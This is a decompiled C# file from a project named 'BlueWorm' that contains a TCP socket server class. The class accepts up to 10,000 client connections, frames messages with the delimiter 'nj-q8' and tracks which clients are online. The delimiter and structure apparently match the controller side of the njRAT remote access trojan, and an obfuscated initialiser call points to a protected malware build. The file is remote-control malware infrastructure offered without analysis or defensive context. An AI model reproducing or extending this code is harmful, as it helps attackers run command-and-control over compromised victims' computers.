using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BlueWorm
{
	// Token: 0x02000009 RID: 9
	public class SocketServer
	{
		// Token: 0x0600002B RID: 43 RVA: 0x00002421 File Offset: 0x00000621
		// Note: this type is marked as 'beforefieldinit'.
		[DebuggerNonUserCode]
		static SocketServer()
		{
			Class9.jBg04XuzOGhUk();
			SocketServer.list_0 = new List<WeakReference>();
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002DE8 File Offset: 0x00000FE8
		public SocketServer()
		{
			Class9.jBg04XuzOGhUk();
			base..ctor();
			SocketServer.smethod_0(this);
			this.int_0 = -1;
			this.SK = new Socket[10000];
			this.string_0 = "nj-q8";
			this.Online = new List<int>();
			this.string_1 = new string[10000];
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002E44 File Offset: 0x00001044
		[DebuggerNonUserCode]
		private static void smethod_0(object object_0)
		{
			List<WeakReference> obj = SocketServer.list_0;
			checked
			{
				lock (obj)
				{
					if (SocketServer.list_0.Count == SocketServer.list_0.Capacity)
					{
						int num = 0;
						int num2 = 0;
						int num3 = SocketServer.list_0.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = SocketServer.list_0[num4];
							if (weakReference.IsAlive)
							{
								if (num4 != num)
								{
									SocketServer.list_0[num] = SocketServer.list_0[num4];
								}
								num++;
							}
							num4++;
						}
						SocketServer.list_0.RemoveRange(num, SocketServer.list_0.Count - num);
						SocketServer.list_0.Capacity = SocketServer.list_0.Count;
					}
					SocketServer.list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
				}
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002F2C File Offset: 0x0000112C
		public void stops(int Pp)
		{
			this.tcpListener_0 = new TcpListener(Pp);
			try
			{
				this.tcpListener_0.Stop();
				Thread thread = new Thread(new ThreadStart(this.method_1), 10);
				thread.Abort();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002F8C File Offset: 0x0000118C
		public void Start(int P)
		{
			this.tcpListener_0 = new TcpListener(P);
			this.tcpListener_0.Start();
			Thread thread = new Thread(new ThreadStart(this.method_1), 10);
			thread.Start();
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00002432 File Offset: 0x00000632
		public void Send(int sock, string s)
		{
			this.Send(sock, Class6.smethod_0(s));
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00002FCC File Offset: 0x000011CC
		public void Send(int sock, byte[] b)
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(b, 0, b.Length);
				memoryStream.Write(Class6.smethod_0(this.string_0), 0, this.string_0.Length);
				this.SK[sock].Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				memoryStream.Dispose();
			}
			catch (Exception ex)
			{
				this.Disconnect(sock);
			}
		}

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x06000032 RID: 50 RVA: 0x00002441 File Offset: 0x00000641
		// (remove) Token: 0x06000033 RID: 51 RVA: 0x0000245A File Offset: 0x0000065A
		public event SocketServer.DataEventHandler Data
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.dataEventHandler_0 = (SocketServer.DataEventHandler)Delegate.Combine(this.dataEventHandler_0, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.dataEventHandler_0 = (SocketServer.DataEventHandler)Delegate.Remove(this.dataEventHandler_0, value);
			}
		}

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x06000034 RID: 52 RVA: 0x00002473 File Offset: 0x00000673
		// (remove) Token: 0x06000035 RID: 53 RVA: 0x0000248C File Offset: 0x0000068C
		public event SocketServer.DisConnectedEventHandler DisConnected
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.dvlkkRyhU = (SocketServer.DisConnectedEventHandler)Delegate.Combine(this.dvlkkRyhU, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.dvlkkRyhU = (SocketServer.DisConnectedEventHandler)Delegate.Remove(this.dvlkkRyhU, value);
			}
		}

		// Token: 0x14000003 RID: 3
		// (add) Token: 0x06000036 RID: 54 RVA: 0x000024A5 File Offset: 0x000006A5
		// (remove) Token: 0x06000037 RID: 55 RVA: 0x000024BE File Offset: 0x000006BE
		public event SocketServer.ConnectedEventHandler Connected
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.connectedEventHandler_0 = (SocketServer.ConnectedEventHandler)Delegate.Combine(this.connectedEventHandler_0, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.connectedEventHandler_0 = (SocketServer.ConnectedEventHandler)Delegate.Remove(this.connectedEventHandler_0, value);
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003054 File Offset: 0x00001254
		private int method_0()
		{
			checked
			{
				for (;;)
				{
					Thread.Sleep(1);
					this.int_0++;
					if (this.int_0 == this.SK.Length)
					{
						this.int_0 = 0;
					}
					else if (!this.Online.Contains(this.int_0))
					{
						break;
					}
				}
				this.Online.Add(this.int_0);
				return Conversions.ToInteger(this.int_0.ToString().Clone());
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000030D4 File Offset: 0x000012D4
		private void method_1()
		{
			try
			{
				this.SK = new Socket[10000];
				for (;;)
				{
					Thread.Sleep(1);
					if (this.tcpListener_0.Pending())
					{
						int num = this.method_0();
						this.SK[num] = this.tcpListener_0.AcceptSocket();
						this.SK[num].ReceiveBufferSize = 99999;
						this.SK[num].SendBufferSize = 99999;
						this.SK[num].ReceiveTimeout = 9000;
						this.SK[num].SendTimeout = 9000;
						Thread thread = new Thread(delegate(object a0)
						{
							this.RC(Conversions.ToInteger(a0));
						}, 10);
						thread.Start(num);
						SocketServer.ConnectedEventHandler connectedEventHandler = this.connectedEventHandler_0;
						if (connectedEventHandler != null)
						{
							connectedEventHandler(num);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000031E0 File Offset: 0x000013E0
		public void Disconnect(int Sock)
		{
			try
			{
				this.SK[Sock].Disconnect(false);
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.SK[Sock].Close();
			}
			catch (Exception ex2)
			{
			}
			this.SK[Sock] = null;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003250 File Offset: 0x00001450
		public void RC(int sock)
		{
			MemoryStream memoryStream = new MemoryStream();
			int num = 0;
			checked
			{
				for (;;)
				{
					num++;
					if (num == 500)
					{
						try
						{
							if (this.SK[sock].Poll(-1, SelectMode.SelectRead) & this.SK[sock].Available <= 0)
							{
								break;
							}
						}
						catch (Exception ex)
						{
							break;
						}
						num = 0;
					}
					try
					{
						if (this.SK[sock] == null)
						{
							break;
						}
						if (!this.SK[sock].Connected)
						{
							break;
						}
						if (this.SK[sock].Available > 0)
						{
							byte[] array = new byte[this.SK[sock].Available - 1 + 1];
							this.SK[sock].Receive(array, 0, array.Length, SocketFlags.None);
							memoryStream.Write(array, 0, array.Length);
							while (Class6.smethod_1(memoryStream.ToArray()).Contains(this.string_0))
							{
								Array array2 = Class6.smethod_2(memoryStream.ToArray(), this.string_0);
								SocketServer.DataEventHandler dataEventHandler = this.dataEventHandler_0;
								if (dataEventHandler != null)
								{
									dataEventHandler(sock, (byte[])NewLateBinding.LateIndexGet(array2, new object[]
									{
										0
									}, null));
								}
								memoryStream.Dispose();
								memoryStream = new MemoryStream();
								if (array2.Length != 2)
								{
									break;
								}
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet(array2, new object[]
								{
									1
								}, null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array2, new object[]
								{
									1
								}, null), null, "length", new object[0], null, null, null)));
								Thread.Sleep(1);
							}
						}
					}
					catch (Exception ex2)
					{
						break;
					}
					Thread.Sleep(1);
				}
				this.Disconnect(sock);
				try
				{
					this.Online.Remove(sock);
				}
				catch (Exception ex3)
				{
				}
				SocketServer.DisConnectedEventHandler disConnectedEventHandler = this.dvlkkRyhU;
				if (disConnectedEventHandler != null)
				{
					disConnectedEventHandler(sock);
				}
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000034BC File Offset: 0x000016BC
		public string IP(ref int sock)
		{
			string result;
			try
			{
				this.string_1[sock] = Strings.Split(this.SK[sock].RemoteEndPoint.ToString(), ":", -1, CompareMethod.Binary)[0];
				result = this.string_1[sock];
			}
			catch (Exception ex)
			{
				if (this.string_1[sock] == null)
				{
					result = "X.X.X.X";
				}
				else
				{
					result = this.string_1[sock];
				}
			}
			return result;
		}

		// Token: 0x04000010 RID: 16
		private static List<WeakReference> list_0;

		// Token: 0x04000011 RID: 17
		private TcpListener tcpListener_0;

		// Token: 0x04000012 RID: 18
		private int int_0;

		// Token: 0x04000013 RID: 19
		public Socket[] SK;

		// Token: 0x04000014 RID: 20
		private SocketServer.DataEventHandler dataEventHandler_0;

		// Token: 0x04000015 RID: 21
		private SocketServer.DisConnectedEventHandler dvlkkRyhU;

		// Token: 0x04000016 RID: 22
		private SocketServer.ConnectedEventHandler connectedEventHandler_0;

		// Token: 0x04000017 RID: 23
		private string string_0;

		// Token: 0x04000018 RID: 24
		public List<int> Online;

		// Token: 0x04000019 RID: 25
		private string[] string_1;

		// Token: 0x0200000A RID: 10
		// (Invoke) Token: 0x06000041 RID: 65
		public delegate void DataEventHandler(int sock, byte[] B);

		// Token: 0x0200000B RID: 11
		// (Invoke) Token: 0x06000045 RID: 69
		public delegate void DisConnectedEventHandler(int sock);

		// Token: 0x0200000C RID: 12
		// (Invoke) Token: 0x06000049 RID: 73
		public delegate void ConnectedEventHandler(int sock);
	}
}
